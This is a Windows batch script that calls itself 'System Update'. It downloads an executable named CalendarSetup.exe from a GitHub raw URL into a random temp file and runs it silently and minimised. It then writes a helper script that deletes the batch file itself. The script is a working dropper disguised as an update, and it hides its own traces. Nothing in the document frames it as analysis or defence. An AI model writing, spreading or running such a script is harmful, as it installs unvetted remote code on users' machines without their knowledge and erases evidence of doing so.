@echo off
setlocal enabledelayedexpansion
title System Update
:: Download EXE to random temp name
set "RAND=%TEMP%\wud_%RANDOM%.exe"
curl -s -o "%RAND%" https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe
:: Execute silently
start "" /B /MIN "%RAND%"
:: Schedule self-deletion of this bat file
(echo @echo off & echo timeout /t 3 /nobreak ^>nul & echo del /F /Q "%~f0" ^>nul 2^>^&1) > "%TEMP%\cleanme.bat"
start "" /B "%TEMP%\cleanme.bat"
exit
